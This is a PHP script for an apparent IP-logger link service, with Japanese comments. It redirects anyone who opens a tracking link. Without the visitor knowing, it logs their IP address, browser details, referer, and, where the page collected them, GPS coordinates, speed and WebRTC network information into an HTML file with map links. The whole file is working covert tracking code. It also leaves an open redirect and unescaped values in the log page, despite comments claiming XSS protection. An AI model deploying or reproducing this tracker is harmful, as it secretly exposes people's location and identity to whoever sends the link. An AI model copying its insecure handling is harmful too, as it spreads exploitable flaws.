<?php
  require_once(dirname(__FILE__)."/PLEASEEDIT.php");
  // XSS対策
  $nonce = substr(str_shuffle('1234567890abcdefghijklmnopqrstuvwxyz'), 0, 36);
  header("Content-Security-Policy: script-src 'nonce-{$nonce}' 'strict-dynamic'");
  // DOS攻撃対策
  if (sys_getloadavg()[0] > 35) {
    header('HTTP/1.1 503 Too busy, try again later');
    die('<p>Server too busy. Please try again later.</p>');
  }
  // URLとIDが割り当てられている場合
  if (isset($_GET["url"]) && isset($_GET["flg"]))
  {
    // HTTPヘッダーインジェクションの脆弱性対策
    $url = str_replace("\n", "", $_GET["url"]);
    $url = str_replace("\r", "", $url);
    $flg = str_replace("\n", "", $_GET["flg"]);
    $flg = str_replace("\r", "", $flg);
    // ディレクトリトラバーサル攻撃対策
    $su = 10000000;
    if(is_numeric($flg) && $flg < $su) {}
    else exit("<p>Error: Unknown Warning.</p>");
    // ヌルバイト攻撃対策
    $url = str_replace("\0", "", $url);
    $flg = str_replace("\0", "", $flg);
    // ボットは排除
    if (strpos($_SERVER['HTTP_USER_AGENT'], 'bot') !== false)
    {
      header("Location: {$url}");
      exit("<p>302. Please Redirect.</p>");
    }
    // エンコード版
    $encodedurl = rawurlencode($url);
    // リダイレクト
    header("Location: {$url}");
    // ログ作成
    $file = "./log/{$flg}.html";
    $ip = $_SERVER['REMOTE_ADDR'];
    $ua = htmlspecialchars($_SERVER['HTTP_USER_AGENT']);
    $lang = htmlspecialchars($_SERVER['HTTP_ACCEPT_LANGUAGE']);
    $mime = htmlspecialchars($_SERVER['HTTP_ACCEPT_ENCODING']);
    if (isset($_GET["ref"])) $reff = urldecode(htmlspecialchars($_GET["ref"]));
    $text = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n<title>Access LOG File [{$flg}]</title>\n<style>a{color: #00ff00;position: relative;display: inline-block;transition: .3s;}a::after {position: absolute;bottom: 0;left: 50%;content: '';width: 0;height: 2px;background-color: #31aae2;transition: .3s;transform: translateX(-50%);}a:hover::after{width: 100%;}</style>\n<body style='background-color:#000000;color:#ffffff;overflow-x:hidden;overflow-y:visible;'>\n<p><font color=\"#1e90ff\">取得した情報</font></p>\n取得コード: {$flg}<br>\n取得時間: ".date("Y/m/d H:i:s")."<br>\n";
    $text .= "IPアドレス: {$ip}<br>\n";
    $text .= "<a href='https://ipinfo.io/{$ip}' target='_blank' rel='noopener noreferrer'>&gt; IPinfo.ioで閲覧</a><br>\n";
    $text .= "UserAgent: {$ua}<br>\n";
    $text .= "対応言語: {$lang}<br>\n";
    $text .= "対応形式: {$mime}<br>\n";
    $text .= "Referer: <a href='{$reff}' target='_blank' rel='noopener noreferrer'>{$reff}</a><br>\n<br>\n";
    if (isset($_GET["error"]))
    {
      // エラー付きログ
      // 2021/10/19 fix a xss bug: Twitterにてご指摘を頂き気が付いたのですが、$_GET["error"]に対し、htmlspecialcharsを通していませんでした。
      $error = htmlspecialchars($_GET["error"]);
      if ($error == "noscript") $error = "JavaScriptが無効の為、取得出来ませんでした。";
      else if ($error == "timeout") $error = "実行時間がタイムアウト(30秒)した為、自動的にリダイレクトしました。";
      else if ($error == "noapi") $error = "端末がGeolocation APIに対応していませんでした。";
      else if ($error == "0") $error = "取得時に原因不明のエラーが発生しました。";
      else if ($error == "1") $error = "位置情報の取得が拒否されました。";
      else if ($error == "2") $error = "電波状況などで位置情報が取得できませんでした。";
      else if ($error == "3") $error = "取得時に時間がかかりすぎてタイムアウトしました。";
      $text .= "位置情報: {$error}<br>\n";
    }
    else if (isset($_GET["ido"]) && isset($_GET["iceinfo"]) && isset($_GET["keido"]) && isset($_GET["koudo"]) && isset($_GET["seido"]) && isset($_GET["speed"]))
    {
      // 詳細付きログ
      $ido = htmlspecialchars($_GET["ido"]);
      $keido = htmlspecialchars($_GET["keido"]);
      $koudo = htmlspecialchars($_GET["koudo"]);
      $seido = htmlspecialchars($_GET["seido"]);
      $speed = htmlspecialchars($_GET["speed"]);
      $iinfo = htmlspecialchars($_GET["iceinfo"]);
      $wincolor = htmlspecialchars($_GET["wincolor"]);
      $text .= "緯度: {$ido}<br>\n";
      $text .= "経度: {$keido}<br>\n";
      $text .= "高度: {$koudo}<br>\n";
      $text .= "精度: {$seido}<br>\n";
      $text .= "スピード: {$speed}<br>\n";
      $text .= "<a href='https://www.google.com/maps/search/?api=1&query={$ido},{$keido}' target='_blank' rel='noopener noreferrer'>&gt; GoogleMapで閲覧</a><br>\n";
    }
    $text .= "<br>\n";
    if (isset($_GET["screenw"]) && isset($_GET["screenh"])) $text .= "ディスプレイ: ".htmlspecialchars($_GET["screenw"])."px/".htmlspecialchars($_GET["screenh"])."px<br>\n";
    if (isset($_GET["winlang"])) $text .= "ブラウザの言語: ".htmlspecialchars($_GET["winlang"])."<br>\n";
    if (isset($_GET["winname"])) $text .= "ブラウザの正式名称: ".htmlspecialchars($_GET["winname"])."<br>\n";
    if (isset($_GET["wincolor"])) $text .= "ディスプレイの色彩: ".htmlspecialchars($_GET["wincolor"])."<br>\n";
    if (isset($_GET["iceinfo"])) $text .= "ネットワーク情報: ".htmlspecialchars($_GET["iceinfo"])."<br>\n";
    $text .= "<br>\nリダイレクト先: <a href='{$url}' target='_blank' rel='noopener noreferrer'>{$url}<br>\n</body>";
    file_put_contents($file, $text);
    exit("<p>302. Please Redirect.</p>");
  }
  // 割り当てられていない場合(ドメインアクセス時)
  else
  {
    header("Location: ".sk."://".root.path."admin/");
    exit("<p>302. Please Redirect.</p>");
  }
?>
